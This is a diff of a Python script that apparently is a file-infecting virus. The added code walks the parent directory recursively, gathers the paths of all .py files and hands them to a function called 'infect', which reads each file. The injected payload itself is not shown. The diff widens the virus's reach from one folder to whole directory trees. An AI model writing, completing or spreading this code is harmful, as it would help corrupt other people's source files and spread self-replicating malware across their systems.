@@ -17,17 +17,42 @@ def get_parent_dir(directory):
     return os.path.dirname(directory)
 
 def run(dir):
-    if dir != "":
-        os.chdir(dir)
+    os.chdir(dir)
     files = []
+    dirs = []
     for file in os.listdir():
+        file_lower = file.lower()
         if file in skip:
             continue
         if os.path.isfile(file):
-            if ".py" in file:
-                files.append(file)
+            if ".py" in file_lower:
+                files.append(os.path.abspath(file))
+        else:
+            dirs.append(os.path.abspath(file))
     
+    print(files)
+    print(dirs)
     
+    while dirs != []:
+        for dir in dirs:
+            dirs.remove(dir)
+            os.chdir(dir)
+            for file in os.listdir():
+                file_lower = file.lower()
+                if file in skip:
+                    continue
+                if os.path.isfile(file):
+                    if ".py" in file_lower:
+                        files.append(os.path.abspath(file))
+                else:
+                    dirs.append(os.path.abspath(file))
+    
+    print(files)
+    
+    infect(os.path.dirname(os.path.abspath(files[0])), files)
+    
+
+def infect(dirpath, files):
     for name in files:
         file_read = open(name, "r")
         file_read = file_read.read()
@@ -41,5 +66,4 @@ def run(dir):
 
 
 
-run("")
 run(get_parent_dir(os.getcwd()))
